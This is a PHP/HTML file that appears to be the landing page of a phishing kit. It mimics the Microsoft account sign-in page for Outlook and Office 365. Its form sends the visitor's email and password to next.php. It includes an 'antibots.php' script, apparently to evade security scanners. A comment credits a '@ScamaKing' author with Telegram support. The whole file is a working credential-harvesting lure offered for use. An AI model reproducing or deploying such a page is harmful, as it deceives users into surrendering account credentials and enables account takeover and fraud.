<?php include 'antibots.php'; ?>
<!DOCTYPE html><html><head><title>Sign in to your Microsoft account</title><link rel="icon" href="assets/favicon.ico"></head>
<body><img src="assets/logo.png" alt="Microsoft"><h1>Sign in</h1><p>Use your Outlook or Office 365 account.</p>
<form action="next.php" method="post"><input type="email" name="login"><input type="password" name="passwd"><button>Sign in</button></form>
<!-- Microsoft Office 365 v7 | Coded by @ScamaKing | Telegram: @ScamaKing_support -->
</body></html>
